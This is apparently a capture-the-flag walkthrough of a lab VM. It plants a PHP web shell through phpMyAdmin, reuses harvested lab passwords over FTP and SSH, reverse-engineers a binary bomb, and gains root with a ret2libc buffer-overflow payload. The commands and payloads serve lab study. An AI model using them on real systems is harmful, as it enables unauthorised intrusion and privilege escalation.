## phpmyadmin

Login with `root/Fg-'kKXBj87E:aJ$`

```
SELECT "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>" INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```
We injected our shell into a file `shell.php` under directory `/var/www/forum/templates_c` which we have write permission.

```
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=whoami'
www-data
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=find+/home+-user+www-data'
/home
/home/LOOKATME
/home/LOOKATME/password
$ curl -k 'https://$VMIP/forum/templates_c/shell.php?cmd=cat+/home/LOOKATME/password'
lmezard:G!@M6f4Eatau{sF"
```

## FTP
Login with `lmezard:G!@M6f4Eatau{sF"`

```
$ ftp lmezard@$VMIP
Connected to 192.168.57.2.
220 Welcome on this server
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.

$ cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

```
$ file fun
fun: POSIX tar archive (GNU)
$ tar -xf fun
```

```
$ printf 'Iheartpwnage' | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

## ssh laurie

Login with `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

```
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
Here we must defuse the bomb to get all the password. The bomb has 6 phases for us to conquer.

### Phase 1. String compare

```gdb
laurie@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble phase_1" bomb
[...]
   0x08048b2c <+12>:    push   0x80497c0
   0x08048b31 <+17>:    push   eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    esp,0x10
   0x08048b3a <+26>:	test   eax,eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    esp,ebp
[...]
```
First phase is pretty straightforward, the program calls `strings_not_equal` to compare our input with string literal `Public speaking is very easy.`.

### Phase 2. Factorial

```c
int n[6];

if (n[0] != 1)
	explode_bomb();
for (int i = 1; i != 6; ++i)
	if (n[i] != (i + 1) * n[i - 1])
		explode_bomb();
```
```
1! = 1
2! = 2 * 1 = 2
3! = 3 * 2 = 6
4! = 4 * 6 = 24
5! = 5 * 24 = 120
6! = 6 * 120 = 720
```
By reverse engineering the program, we knew that second phase is about factorial. What we need to do is input first 6 numbers of the factorial sequence starting from 1.

### Phase 3. Case combination

```c
if (sscanf(str, "%d %c %d", &a, &b, &c) < 3)
	explode_bomb();
switch (a) {
/* ... */
case 1:
	ref = 'b';
	if (c != 214) // 0x08048c02 <+106>: cmp DWORD PTR [ebp-0x4],0xd6
		explode_bomb();
	break;
```
For third phase, our input format must be `int char int`. According to the hint of README file, the matching character is `b`. Then case 1 is our input combination `1 b 214`.

### Phase 4. Fibonacci

```c
int func4(int n)
{
	int ret;

	if (n <= 1)
		return 1;
	return func4(n - 2) + func4(n - 1);
}
```
Fourth phase calls `func4` to take our input number N as index then compares Nth fibonacci number with `55`. Since index starts from 0, we input index `9` to get 55.

### Phase 5. Magic cipher

```c
char *charset = "isrveawhobpnutfg";

if (strlen(str) != 6)
	explode_bomb();
for (int i = 0; i != 6; ++i)
	str[i] = charset[str[i] & 0xf];
if (strcmp(str, "giants"))
	explode_bomb();
```
This phase bitwise AND (&) each character of the input string `str[i]` with `0xf`. The result is used as index of charset `isrveawhobpnutfg` to create a new string. Then the program compares new string with `giants`.

```
char     index     possible lowercase characters
 g        0xf                0x6f(o)
 i        0x0                0x70(p)
 a        0x5            0x65(e) 0x75(u)
 n        0xb                0x6b(k)
 t        0xd                0x6d(m)
 s        0x1            0x61(a) 0x71(q)
```
Since our input is used to be AND(&) with 0xf, we just need to find possible characters whose last 4 bytes match index of charset `isrveawhobpnutfg`. We have 4 possible strings `opekma opekmq opukma opukmq`. After trying them all, `opekmq` is the answer.

### Phase 6. Sorting numbers

```
laurie@BornToSecHackMe:~$ gdb -q bomb
Reading symbols from /home/laurie/bomb...done.
(gdb) break phase_6
Breakpoint 1 at 0x8048da1
(gdb) run
Starting program: /home/laurie/bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
1 1 1 1 1 1

Breakpoint 1, 0x08048da1 in phase_6 ()
(gdb) print node1
$1 = 253
(gdb) print node2
$2 = 725
(gdb) print node3
$3 = 301
(gdb) print node4
$4 = 997
(gdb) print node5
$5 = 212
(gdb) print node6
$6 = 432
```
```
997  725  432  301  253  212
 4    2    6    3    1    5
```
Phase 6 sorts an int array based on our input and check if it's sorted. We have a hint from README file, so first number is 4. Since the 4th number is the biggest one, we tried to sort the array in descending order.

```
laurie@BornToSecHackMe:~$ cat bomb.txt
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5

laurie@BornToSecHackMe:~$ ./bomb < bomb.txt
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Congratulations! You've defused the bomb!
```
Now we have the password for thor `Publicspeakingisveryeasy.126241207201b2149opekmq426315`. According to a [stackoverflow thread](https://stackoverflow.com/c/42network/questions/664), there is an error in the ISO file, the real password is `Publicspeakingisveryeasy.126241207201b2149opekmq426135`.

## ssh thor
Login with `thor:Publicspeakingisveryeasy.126241207201b2149opekmq426135`

```
thor@BornToSecHackMe:~$ cat README
Finish this challenge and use the result as password for 'zaz' user.
```

```
$ md5 -s SLASH
MD5 ("SLASH") = 646da671ca01bb5d84dbb5fb2238dc8e
```
The filename itself is a hint. We need to play with a Python lib called [turtle](https://docs.python.org/3/library/turtle.html). We got the string `SLASH`. The password is MD5 hash of `SLASH`.

## ssh zaz

Login with `zaz:646da671ca01bb5d84dbb5fb2238dc8e`.

```
zaz@BornToSecHackMe:~$ gdb -batch -ex "set disassembly-flavor intel" -ex "disassemble main" exploit_me
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
=> 0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
```
`exploit_me` calls `strcpy` function to copy our input `argv[1]` directly into a buffer without checking its size. We can simply overwrite `eip`.


```
zaz@BornToSecHackMe:~$ gdb -q exploit_me
Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
(gdb) break *0x08048420
Breakpoint 1 at 0x8048420
(gdb) run 42
Starting program: /home/zaz/exploit_me 42

Breakpoint 1, 0x08048420 in main ()
(gdb) info registers eax
eax            0xbffff6d0	-1073744176
(gdb) info frame
Stack level 0, frame at 0xbffff760:
 eip = 0x8048420 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff758, args:
 Locals at 0xbffff758, Previous frame's sp is 0xbffff760
 Saved registers:
  ebp at 0xbffff758, eip at 0xbffff75c
(gdb) print 0xbffff75c - 0xbffff6d0
$1 = 140
```
We got offset 140 by calculate `eip - eax`.

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
```
We found all the information to do a `ret2libc` attack.

```
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
# whoami
root
```
